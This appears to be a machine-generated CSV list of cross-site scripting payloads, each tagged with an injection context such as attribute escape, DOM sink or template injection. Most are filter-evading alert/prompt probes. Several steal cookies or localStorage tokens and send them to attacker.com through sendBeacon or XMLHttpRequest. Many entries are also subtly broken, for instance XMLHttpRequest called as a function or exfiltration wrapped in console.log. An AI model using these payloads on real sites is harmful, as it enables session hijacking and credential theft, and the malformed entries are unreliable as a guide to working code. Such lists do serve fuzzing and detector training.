payload,context
"ObjEct.asSigN(wIndOw,{""oNfoCus"":cOnsOle.loG})",dom_sink
"""%3E%3Cbody onpointermove=alert(location.hash)%3E",tag_injection
'><img src=x oninvalid=prompt(1)>,attribute_escape
\' OndRop=coNfiRm(DocUmeNt.DomAin)//,attribute_escape
oncontextmenu=\u0061lert&#40;'XSS'&#41;,event_handler
"EvaL(""EvaL('XSS')"")",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""oncut"":prompt})",dom_sink
"""><DiaLog onEndEd=ConSolE.lOg(1)>",tag_injection
"'><img src=x onanimationiteration=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"%22><body ongesturestart=console.log(String.fromCharCode(88,83,83))>",tag_injection
OnpOinTerMovE=cOnfIrm/***/('XSS'),event_handler
document.querySelector(%22body%22).innerHTML+=%22fetch(location.hash)%22,dom_sink
"__proto__[""onmous&#101;ov&#101;r""]=XMLHttpR&#101;qu&#101;st(1)",dom_sink
" ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
%3Cbutton src=x onclick=console.log(1)%3E,tag_injection
"OnaNimAtiOniTerAtiOn=JavAscRipT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",event_handler
"OnpRomPtaCtiOn=ConFirM&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler
'><img src=x on&#101;nd=consol&#101;.log('XSS')>,attribute_escape
%22><img src=x ontouchmove=prompt(1)>,attribute_escape
""" ><svg onfocusin=prompt(1)>",attribute_escape
' ><svg onanimationiteration=console.log('XSS')>,attribute_escape
"' %3E%3Csvg ongotpointercapture=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"window[""XMLHttpR&#101;qu&#101;st""](loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
%27 onbegin=console.log(location.hash) %27,attribute_escape
"<listing
onk&#101;yup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
""" ><svg ondblclick=console.log('XSS')>",attribute_escape
"' ><svG oNinValId=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
`><img src=x onpagereveal=\u0061lert(location.hash)>,attribute_escape
"ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"' ><svg onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape
%3Canimate src=x onpageshow=console.log('XSS')%3E,tag_injection
<b&#97;s&#101; oninv&#97;lid=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
"\"" OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')//",attribute_escape
"' onbegin=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1) """,attribute_escape
"""><Img srC=x onDraGovEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
""" ><svg onkeypress=confirm('XSS')>",attribute_escape
`><img src=x ontransitionstart=confirm(document.domain)>,attribute_escape
{{[].pop.constructor(%27prompt(document.domain)%27)()}},template_injection
"<!--><blink onp&#97;g&#101;hid&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
JavAscRipT:%0apRomPt('XSS'),js_uri
"""%3E%3Cimg src=x ondragover=prompt(1)%3E",attribute_escape
"<maRquEe OnpRomPtdIsmIss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
"EleMenT.sEtATtrIbuTe(""onCliCk"",""XMLHTtpReqUesT(lOcaLStOraGe.GetIteM('TokEn'))"")",dom_sink
"__proto__[""ondragenter""]=console.log(document.cookie+'&loc='+location.href)",dom_sink
"java
scr	ipt:alert(1)",js_uri
' ontoggl&#101;=consol&#101;.log('XSS') ',attribute_escape
`><img src=x ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
onp&#97;us&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"document.body.innerHTML=""%3Cimg src=x onerror=fetch(String.fromCharCode(88,83,83))%3E""",dom_sink
%27><img src=x onhashchange=prompt(%27XSS%27)>,attribute_escape
`><img src=x ondblclick=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
""" onbeforecut=\u0061lert(document.domain) """,attribute_escape
' oNfuLlsCreEncHanGe=ConSolE.lOg(1) ',attribute_escape
<SCRIPT>&#97;l&#101;rt(1)</SCRIPT>,script_injection
"(neW FUncTioN(""ConFirM(dOcuMenT.dOmaIn)""))();",dom_sink
<taBle onSelEct=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
"\"" onauxclick=alert(1)//",attribute_escape
"%27><img src=x onscrollsnapchange=prompt(String.fromCharCode(88,83,83))>",attribute_escape
&quot; onsearch=alert(%27XSS%27) x=&quot;,attribute_escape
"\"" onb&#101;for&#101;input=consol&#101;.log('XSS')//",attribute_escape
' ><svg onc&#97;npl&#97;y=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"' ><svg ongotpoint&#101;rc&#97;ptur&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"&#106;&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
"__proto__[""onbeforepaste""]=eval(String.fromCharCode(88,83,83))",dom_sink
'><img src=x onb&#101;for&#101;m&#97;tch=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"""><noscr	ipt onpaste=confirm(location.hash)>",tag_injection
"<t&#97;bl&#101;
ontouch&#101;nd=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
<svg onpromptdismiss=\u0061lert(location.hash)/>,tag_injection
"document.write(""<img src=x onerror=\u0061lert(document.cookie)>"")",dom_sink
"ObjEct.asSigN(wIndOw,{""oNpoPstAte"":cOnfIrm})",dom_sink
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(1)""",dom_sink
"%22 ><svg onerror=confirm(String.fromCharCode(88,83,83))>",attribute_escape
""" ongotpoint&#101;rc&#97;ptur&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"setInterval(%22eval(localStorage.getItem(%27token%27))%22,100)",dom_sink
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=fEtcH(dOcuMenT.dOmaIn)>"")",dom_sink
#set($x='confirm(document.cookie)')$x,template_injection
%27 onbeforematch=alert(%27XSS%27) %27,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onw&#101;bkit&#97;nim&#97;tion&#101;nd"":f&#101;tch})",dom_sink
"onclose=alert/***/(String.fromCharCode(88,83,83))",event_handler
"<script
>\u0061lert('XSS')</script>",script_injection
""" ><svG oNvoLumEchAngE=aLerT(dOcuMenT.dOmaIn)>",attribute_escape
"`%3E%3Cimg src=x onpaste=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"Object.assign(window,{""ontransitionstart"":fetch})",dom_sink
"s&#101;tTim&#101;out(""consol&#101;.log('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink
<form x=y onwaiting=confirm(1)>,tag_injection
'><img src=x onwheel=\u0061lert('XSS')>,attribute_escape
"%3Cnoscript x=y onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"<!--><Div onWebKitFulLscReeNchAngE=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<maRquEe Src=x OnaUxcLicK=cOnfIrm(loCatIon.haSh)>,tag_injection
"setInterval(""fetch(btoa(document.cookie))"",100)",dom_sink
"element.setAttribute(""onclick"",""\u0061lert(btoa(document.cookie))"")",dom_sink
<&#97;nim&#97;t&#101;tr&#97;nsform src=x oncont&#101;xtm&#101;nu=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
%3Ctemplate x=y ondragenter=alert('XSS')%3E,tag_injection
"""><Img srC=x onBefOrePasTe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
<video ondragstart=alert('XSS')>,tag_injection
"<t&#101;mpl&#97;t&#101;
onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" oNfoCus=coNsoLe.Log(doCumEnt.doMaiN) AutOfoCus=""",attribute_escape
"d&#97;t&#97;:t&#101;xt/html,<script>prompt(1)</script>",js_uri
#{confirm(docum&#101;nt.dom&#97;in)},template_injection
%27 oncontextmenu=alert(1) %27,attribute_escape
#s&#101;t($x='confirm(docum&#101;nt.cooki&#101;)')$x,template_injection
"s&#101;tTim&#101;out(""XMLHttpR&#101;qu&#101;st(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",0)",dom_sink
OnpOinTerDowN=pRomPt(1),event_handler
'><img src=x ongestureend=prompt(document.domain)>,attribute_escape
{&#97;l&#101;rt 'XSS'},template_injection
OniNvaLid=prOmpT&#40;1&#41;,event_handler
""" onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
"%22><img src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape
<object src=x ontouchstart=console.log(location.hash)>,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=prompt(bto&#97;(docum&#101;nt.cooki&#101;))>""",dom_sink
{{constructor['constructor']('alert(document.cookie)')()}},template_injection
' oNbeGin=coNfiRm(1) ',attribute_escape
%3C!--%3E%3Cmath ondragover=prompt(1)%3E,tag_injection
"	oninput=\u0061lert(String.fromCharCode(88,83,83))",event_handler
\' onerror=console.log(document.domain)//,attribute_escape
ondblclick=console.log&#40;1&#41;,event_handler
"""><pl&#97;int&#101;xt ontouchst&#97;rt=&#97;l&#101;rt(1)>",tag_injection
"%3Cbase
onkeydown=alert('XSS')%3E",tag_injection
"&quot; onanimationiteration=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
""" onpopstate=confirm(document.domain) """,attribute_escape
""" ><svg ontoggle=confirm('XSS')>",attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)>""",dom_sink
"' ><svG oNplAy=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"OnpOinTerMovE=jAvaScrIpt:prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
%3Cscript%3E/*/alert(location.hash)%3C/script%3E,script_injection
<%= alert %27XSS%27 %>,template_injection
' oNpoIntErrAwuPdaTe=AleRt('XSS') ',attribute_escape
"OnlOad=prOmpT/**/(StrIng.frOmCHarCodE(88,83,83))",event_handler
<arEa OnpAgeShoW=pRomPt('XSS')>,tag_injection
"EvaL(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))"")",dom_sink
"\"" onauxclick=console.log(1)//",attribute_escape
<&#97;nim&#97;t&#101;motion onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
' ><svG oNtoUchEnd=alErt('XSS')>,attribute_escape
	onselect=prompt(location.hash),event_handler
 onStaLleD=cOnfIrm(loCatIon.haSh),event_handler
ontransitionrun=\u0061lert&#40;1&#41;,event_handler
""" oNplAy=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape
"__proto__[""onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;""]=confirm(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
""" ><svg onload=\u0061lert(1)>",attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))>""",dom_sink
<td onst&#97;ll&#101;d=confirm('XSS')/>,tag_injection
"JAVASCRIPT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",js_uri
<t&#97;bl&#101; ontouch&#101;nd=prompt(docum&#101;nt.dom&#97;in) ontouch&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"ons&#101;l&#101;ct=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
%27 ><svg ongestureend=prompt(document.domain)>,attribute_escape
{{constructor['constructor']('prompt('XSS')')()}},template_injection
<base src=x oninput=alert(%27XSS%27)>,tag_injection
"<arEa Src=x OneNdeD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
OnaNimAtiOncAncEl=ProMpt(loCatIon.haSh),event_handler
"javascript:%0a\u0061lert(String.fromCharCode(88,83,83))",js_uri
' onfocusout=\u0061lert(location.hash) ',attribute_escape
`%3E%3Cimg src=x onpageshow=console.log(location.hash)%3E,attribute_escape
%3Cscript onclick=prompt('XSS')%3E,tag_injection
"__proto__[""onscrollsn&#97;pch&#97;ng&#101;""]=f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
"""><img src=x onmousewheel=\u0061lert(location.hash)>",attribute_escape
&quOt; onGesTurEstArt=prOmpT('XSS') X=&QuoT;,attribute_escape
"oncont&#101;xtm&#101;nu=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"&#101;v&#97;l(""&#97;l&#101;rt(1)"")",dom_sink
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=alert(btoa(document.cookie))>"")",dom_sink
"LocAtiOn=""jaVasCriPt:EvaL(lOcaLStOraGe.GetIteM('TokEn'))""",dom_sink
<body onclos&#101;=consol&#101;.log('XSS') onclos&#101;=consol&#101;.log('XSS')>,tag_injection
onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
\%27 ondblclick=console.log(%27XSS%27)//,attribute_escape
"__pRotO__[""oNpaGesHow""]=EvaL(dOcuMenT.cOokIe)",dom_sink
<maRquEe	OnkEydOwn=coNfiRm(1)>,tag_injection
' ><svG oNdrAgeNteR=pRomPt(DocUmeNt.DomAin)>,attribute_escape
"Object.assign(window,{%22ondrop%22:eval})",dom_sink
"(new Function(""eval(localStorage.getItem('token'))""))();",dom_sink
'><Img srC=x onGotPoiNteRcaPtuRe=ConFirM(lOcaTioN.hAsh)>,attribute_escape
"SetTimEouT(""ConSolE.lOg('XSS')"",0)",dom_sink
<&#97;r&#101;&#97; onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
' ><svg onb&#101;for&#101;cut=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
"__pRotO__[""oNtoUchEnd""]=ConSolE.lOg(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)",dom_sink
onclick=prompt&#40;'XSS'&#41;,event_handler
'><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log('XSS')>,attribute_escape
%22 onpointermove=prompt(location.hash) %22,attribute_escape
""" oNbeForEpaSte=alErt(1) """,attribute_escape
<math ondragover=prompt(1)>,tag_injection
"<math
oncopy=console.log(document.domain)>",tag_injection
 onsecuritypolicyviolation=console.log(document.domain),event_handler
"document.write(%22<img src=x onerror=confirm(String.fromCharCode(88,83,83))>%22)",dom_sink
{% ProMpt 'XSS' %},template_injection
`%3E%3Cimg src=x onfocusin=prompt(1)%3E,attribute_escape
"\%22 onended=alert(String.fromCharCode(88,83,83))//",attribute_escape
document.body.innerHTML=%22<img src=x onerror=console.log(btoa(document.cookie))>%22,dom_sink
onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=fetch(document.cookie)>"")",dom_sink
	onbeforematch=prompt('XSS'),event_handler
onfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log&#40;1&#41;,event_handler
""" oNpoPstAte=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
{% alert document.domain %},template_injection
onpaste=prompt(document.domain),event_handler
OnfOcuSin=coNfiRm/**/(doCumEnt.doMaiN),event_handler
<audio	onpause=console.log(document.domain)>,tag_injection
__proto__[%22onfocusout%22]=alert(btoa(document.cookie)),dom_sink
%27><img src=x onmousewheel=prompt(%27XSS%27)>,attribute_escape
\%22 onpointerup=alert(1)//,attribute_escape
"onp&#97;g&#101;show=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"__proto__[""onk&#101;ypr&#101;ss""]=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
<form x=y ongesturestart=console.log('XSS')>,tag_injection
"""><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log(doCumEnt.doMaiN)>",attribute_escape
""" ondblclick=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
"%3Cplaintext onpause=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<baSe OnkEydOwn=alErt('XSS')/>,tag_injection
"""><Img srC=x onPlaY=cOnfIrm(1)>",attribute_escape
"document.querySelector(""body"").innerHTML+=""eval(document.domain)""",dom_sink
"<scRipT>//alErt(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
`><img src=x onbeforematch=alert(%27XSS%27)>,attribute_escape
"onbeforecopy=alert(String.fromCharCode(88,83,83))",event_handler
<spAn OnsEcuRitYpoLicYviOlaTioN=aLerT(lOcaTioN.hAsh)>,tag_injection
'%3E%3Cimg src=x onpromptaction=console.log('XSS')%3E,attribute_escape
javascript:void(alert(location.hash)),js_uri
"""><img src=x ontouchmov&#101;=prompt(1)>",attribute_escape
"<anImaTe
OnpAgeShoW=cOnsOle.loG('XSS')>",tag_injection
onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log/**/(1),event_handler
onpopstate=confirm&#40;%27XSS%27&#41;,event_handler
	onMouSeeNteR=pRomPt(DocUmeNt.DomAin),event_handler
"%3Carea src=x onended=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
`%3E%3Cimg src=x onsearch=prompt(location.hash)%3E,attribute_escape
&quOt; onInpUt=ConFirM(1) x=&qUot;,attribute_escape
"%22 ><svg onvolumechange=prompt(String.fromCharCode(88,83,83))>",attribute_escape
ontransitionrun=alert/***/(1),event_handler
""" ><svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"window[""fetch""](btoa(document.cookie))",dom_sink
"<boDy	OngEstUreStaRt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
OnbEfoRecOpy=jaVasCriPt:AleRt(DocUmeNt.DomAin),event_handler
"__pRotO__[""oNbeForEtoGglE""]=XMLHtTpREquEst(doCumEnt.doMaiN)",dom_sink
<b&#97;s&#101; onb&#101;for&#101;copy=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"document.querySelector(""body"").innerHTML+=""confirm('//attacker.com/?c='+document.cookie)""",dom_sink
\' OntRanSitIonEnd=prOmpT(lOcaTioN.hAsh)//,attribute_escape
<animatetransform/onpointermove=console.log('XSS')>,tag_injection
"document.body.innerHTML=""%3Cimg src=x onerror=console.log(navigator.sendBeacon('//attacker.com',document.cookie))%3E""",dom_sink
"""%3E%3Cimg src=x onkeypress=alert('XSS')%3E",attribute_escape
"%3C!--%3E%3Cplaintext onpause=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
onfocusout=alert&#40;'XSS'&#41;,event_handler
"""><img src=x ons&#101;&#97;rch=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
"<body/ongesturestart=console.log(String.fromCharCode(88,83,83))>",tag_injection
<s&#101;t x=y onclos&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<deTaiLs X=y onRepEat=prOmpT(1)>,tag_injection
<!--><form onreset=console.log(document.domain)>,tag_injection
j&#97;v&#97;script:%0&#97;prompt(1),js_uri
%22 ><svg onmouseover=confirm(%27XSS%27)>,attribute_escape
' ><svg onb&#101;for&#101;m&#97;tch=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"\"" onmous&#101;down=consol&#101;.log('XSS')//",attribute_escape
' %3E%3Csvg oninput=confirm(1)%3E,attribute_escape
"""%3E%3Cvideo onpaste=alert(String.fromCharCode(88,83,83))%3E",tag_injection
"javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=alert(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri
""" ><svg onreset=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"Object.assign(window,{""onchange"":\u0061lert})",dom_sink
onwaiting=console.log(location.hash),event_handler
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=eVal('//atTacKer.coM/?C='+doCumEnt.coOkiE)>""",dom_sink
"window[""prompt""](docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
ontr&#97;nsitionst&#97;rt=j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh),event_handler
"ondblclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
&quot; onanimationiteration=console.log('XSS') x=&quot;,attribute_escape
'><img src=x onmouseup=prompt(document.domain)>,attribute_escape
"onpromptdismiss=javascr	ipt:prompt(String.fromCharCode(88,83,83))",event_handler
' onpl&#97;y=confirm(1) ',attribute_escape
%3Cvideo x=y onclick=console.log('XSS')%3E,tag_injection
onauxclick=prompt/**/(1),event_handler
{php}\u0061lert(1){/php},template_injection
' ><svg onmouseenter=\u0061lert(location.hash)>,attribute_escape
oncut=javascript:\u0061lert(1),event_handler
<animatemotion	onwaiting=alert(location.hash)>,tag_injection
`><img src=x ongotpointercapture=console.log('XSS')>,attribute_escape
<scr	ipt>prompt('XSS')</scr	ipt>,script_injection
""" ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1) """,attribute_escape
" onSubMit=coNfiRm(StrIng.frOmCHarCodE(88,83,83))",event_handler
"s&#101;tInt&#101;rv&#97;l(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;)"",100)",dom_sink
<scRipT	>ProMpt(loCatIon.haSh)</sCriPt>,script_injection
<form onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh) onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
<animate onwebkitfullscreenchange=console.log(1) onwebkitfullscreenchange=console.log(1)>,tag_injection
"<&#97;nim&#97;t&#101;tr&#97;nsform src=x ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%27><img src=x ongesturestart=alert(location.hash)>,attribute_escape
<title onstalled=alert('XSS') onstalled=alert('XSS')>,tag_injection
"""><Img srC=x onBefOreCut=alErt(doCumEnt.doMaiN)>",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""on&#101;nd"":prompt})",dom_sink
"\"" onpoint&#101;rov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"<pl&#97;int&#101;xt
onr&#101;p&#101;&#97;t=prompt('XSS')>",tag_injection
" ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
""" ><svg onhashchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape
eval(%22XMLHttpRequest(document.cookie+%27&loc=%27+location.href)%22),dom_sink
<&#97;nim&#97;t&#101;tr&#97;nsform oncont&#101;xtm&#101;nu=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"LocAtiOn=""jaVasCriPt:AleRt(StrIng.frOmCHarCodE(88,83,83))""",dom_sink
%22><img src=x onblur=console.log(document.domain)>,attribute_escape
"""><img src=x onk&#101;ydown=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
<sp&#97;n onb&#101;for&#101;toggl&#101;=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
"\' OnpOinTerMovE=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
"(new Function(""console.log(document.cookie+'&loc='+location.href)""))();",dom_sink
""" ontoggl&#101;=confirm('XSS') """,attribute_escape
%22><img src=x ongesturestart=prompt(%27XSS%27)>,attribute_escape
"(n&#101;w Function(""consol&#101;.log(docum&#101;nt.cooki&#101;)""))();",dom_sink
"`><img src=x onbegin=alert(String.fromCharCode(88,83,83))>",attribute_escape
\' onpointermove=\u0061lert(document.domain)//,attribute_escape
"__proto__[""ong&#101;stur&#101;&#101;nd""]=prompt('XSS')",dom_sink
%3Ca src=x onkeypress=confirm(1)%3E,tag_injection
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)"")",dom_sink
<noScrIpt/onBefOreMatCh=ConSolE.lOg('XSS')>,tag_injection
"\"" OndBlcLicK=cOnsOle.loG('XSS')//",attribute_escape
"<boDy OnfOcuSouT=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
"\"" onpopstate=alert(1)//",attribute_escape
 onLoaD=aLerT(dOcuMenT.dOmaIn),event_handler
"""%3E%3Cmath oncopy=console.log(document.domain)%3E",tag_injection
" onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<liStiNg OnwEbkItaNimAtiOneNd=ConSolE.lOg('XSS') onWebKitAniMatIonEnd=coNsoLe.Log('XSS')>,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(doCumEnt.coOkiE)>""",dom_sink
"\"" onselect=prompt(String.fromCharCode(88,83,83))//",attribute_escape
{{cOnsTruCtoR.cOnsTruCtoR('ConFirM(dOcuMenT.cOokIe)')()}},template_injection
' ><svg ontouchmove=confirm(document.domain)>,attribute_escape
"' ><svg onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"__proto__[""ondrop""]=console.log(document.cookie)",dom_sink
`><img src=x onpaste=confirm('XSS')>,attribute_escape
"""><scr	ipt>confirm('XSS')</scr	ipt>",script_injection
"Obj&#101;ct.&#97;ssign(window,{""on&#101;rror"":prompt})",dom_sink
<img onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS')/>,tag_injection
"onw&#101;bkittr&#97;nsition&#101;nd=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
#\u0061lert(document.domain),template_injection
%22 onselect=prompt(1) %22,attribute_escape
 onplaying=console.log(document.domain),event_handler
"' ><svg onpaste=confirm(String.fromCharCode(88,83,83))>",attribute_escape
<&#97;nim&#97;t&#101;/onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
`><img src=x ontoggle=console.log(1)>,attribute_escape
%22 ><svg onpromptaction=prompt(1)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""ong&#101;stur&#101;&#101;nd"":prompt})",dom_sink
%3Cbase oninvalid=confirm(location.hash)/%3E,tag_injection
"""><audio onpause=console.log(document.domain)>",tag_injection
"LocAtiOn=""jaVasCriPt:ProMpt(1)""",dom_sink
&quot; ongestureend=console.log('XSS') x=&quot;,attribute_escape
""" ><svG oNclIck=prOmpT('XSS')>",attribute_escape
\' ontouchmove=console.log(document.domain)//,attribute_escape
"' %3E%3Csvg onpopstate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
<base ontransitionstart=prompt(location.hash) ontransitionstart=prompt(location.hash)>,tag_injection
"Object.assign(window,{%22onmousedown%22:XMLHttpRequest})",dom_sink
